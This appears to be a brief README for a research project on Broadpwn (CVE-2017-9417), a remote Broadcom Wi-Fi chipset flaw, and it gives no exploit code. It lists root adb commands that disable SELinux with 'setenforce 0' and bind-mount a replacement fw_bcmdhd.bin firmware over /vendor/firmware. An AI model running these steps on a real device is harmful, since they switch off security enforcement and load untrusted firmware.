# Broadpwn
Broadpwn bug (CVE-2017-9417)

  Remotely Compromising Android and iOS via a Bug in Broadcom’s Wi-Fi Chipsets

  $ adb shell 
  
  #setenforce 0
  
  #cp fw_bcmdhd.bin /data/local/tmp/firmware/
  
  #chmod 755 /data/local/tmp/firmware/fw_bcmdhd.bin
  
  #mount -o bind /data/local/tmp/firmware /vendor/firmware
  
  #stop
  
  #start

  If you have any questions: Linnebergmai@gmail.com
